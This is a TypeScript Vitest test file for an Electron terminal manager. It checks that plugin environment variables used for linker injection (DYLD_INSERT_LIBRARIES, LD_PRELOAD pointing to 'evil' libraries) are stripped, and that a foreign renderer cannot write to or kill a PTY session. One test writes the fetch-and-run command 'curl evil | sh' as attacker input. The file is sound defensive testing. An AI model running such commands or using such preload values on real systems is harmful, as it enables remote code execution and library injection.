import { describe, expect, it, vi } from 'vitest';
import type { WebContents } from 'electron';
import {
  agentEnv,
  getSessionState,
  killSession,
  setPtyHost,
  spawnSession,
  writeSession,
} from './pty-manager';
import type { PtyHost, PtyProcHandle } from './pty-host-core';
import type { CliPtyAdapter } from '../../shared/adapter-types';

// A minimal, valid cli-pty adapter shaped just enough for agentEnv(). Only the
// `env` block matters here; the rest satisfies the type.
function makeAdapter(env: CliPtyAdapter['env']): CliPtyAdapter {
  return {
    kind: 'cli-pty',
    id: 'test-cli',
    label: 'Test CLI',
    version: '1.0.0',
    icon: '🤖',
    bin: 'test-cli',
    detect: 'test-cli --version',
    install: { method: 'npm', command: 'npm install -g test-cli' },
    auth: { method: 'none' },
    spawn: {
      interactive: ['test-cli'],
      headless: ['test-cli', '--prompt', '{{PROMPT}}'],
      ptyRequired: true,
      resumeArgs: [],
      extraArgs: [],
    },
    env,
    models: { flag: '--model', list: ['default'], default: 'default' },
    promptInjection: { method: 'arg', trailingNewline: true, bracketedPaste: false },
    stateParsing: {
      idle: { type: 'timeout', ms: 500 },
      shellIntegration: false,
      exitCodes: {},
    },
    quirks: { altScreen: false, requiresNoAutoUpdate: false, mcpAutoload: false },
    control: {},
  } as CliPtyAdapter;
}

describe('agentEnv linker-injection guard (plugin trust boundary)', () => {
  it('drops DYLD_ keys from env.static', () => {
    const env = agentEnv(
      makeAdapter({
        static: { DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib', SAFE_VAR: 'ok' },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.DYLD_INSERT_LIBRARIES).toBeUndefined();
    expect(env.SAFE_VAR).toBe('ok');
  });

  it('drops LD_ keys from env.static', () => {
    const env = agentEnv(
      makeAdapter({
        static: { LD_PRELOAD: '/tmp/evil.so', LD_LIBRARY_PATH: '/tmp' },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.LD_PRELOAD).toBeUndefined();
    expect(env.LD_LIBRARY_PATH).toBeUndefined();
  });

  it('drops DYLD_/LD_ keys from env.passthrough even if present in process.env', () => {
    process.env.DYLD_TEST_INJECT = 'x';
    process.env.LD_TEST_INJECT = 'y';
    try {
      const env = agentEnv(
        makeAdapter({
          static: {},
          passthrough: ['DYLD_TEST_INJECT', 'LD_TEST_INJECT'],
          ephemeralHome: false,
        }),
      );
      expect(env.DYLD_TEST_INJECT).toBeUndefined();
      expect(env.LD_TEST_INJECT).toBeUndefined();
    } finally {
      delete process.env.DYLD_TEST_INJECT;
      delete process.env.LD_TEST_INJECT;
    }
  });

  it('keeps ordinary static and passthrough vars', () => {
    process.env.NEXUS_TEST_TOKEN = 'secret';
    try {
      const env = agentEnv(
        makeAdapter({
          static: { FOO: 'bar' },
          passthrough: ['NEXUS_TEST_TOKEN'],
          ephemeralHome: false,
        }),
      );
      expect(env.FOO).toBe('bar');
      expect(env.NEXUS_TEST_TOKEN).toBe('secret');
    } finally {
      delete process.env.NEXUS_TEST_TOKEN;
    }
  });
});

// A WebContents stub that always accepts sends (canSend passes).
function fakeWc(): WebContents {
  return {
    isDestroyed: () => false,
    isCrashed: () => false,
    send: () => {},
  } as unknown as WebContents;
}

// Records the per-session proxy so a test can see which control calls fired.
function fakeHost(): { host: PtyHost; procFor: (id: string) => PtyProcHandle } {
  const procs = new Map<string, PtyProcHandle>();
  return {
    host: {
      spawn(spec) {
        const proc: PtyProcHandle = {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
        };
        procs.set(spec.sessionId, proc);
        return proc;
      },
    },
    procFor: (id) => procs.get(id)!,
  };
}

describe('PTY session ownership (renderer capability boundary)', () => {
  it('only the owning WebContents can write to / kill a session', () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();

    const { sessionId } = spawnSession(owner, { kind: 'shell', cols: 80, rows: 24 });
    const proc = h.procFor(sessionId);

    // A different renderer (or a session id it guessed) is refused: no bytes reach the PTY.
    writeSession(attacker, sessionId, 'curl evil | sh\n');
    expect(proc.write).not.toHaveBeenCalled();

    // The owner writes normally.
    writeSession(owner, sessionId, 'ls\n');
    expect(proc.write).toHaveBeenCalledWith('ls\n');

    // A foreign kill is a no-op; the session stays live.
    killSession(attacker, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(getSessionState(sessionId)).not.toBeNull();

    // The owner kills it.
    killSession(owner, sessionId);
    expect(proc.kill).toHaveBeenCalledTimes(1);
    expect(getSessionState(sessionId)).toBeNull();
  });
});
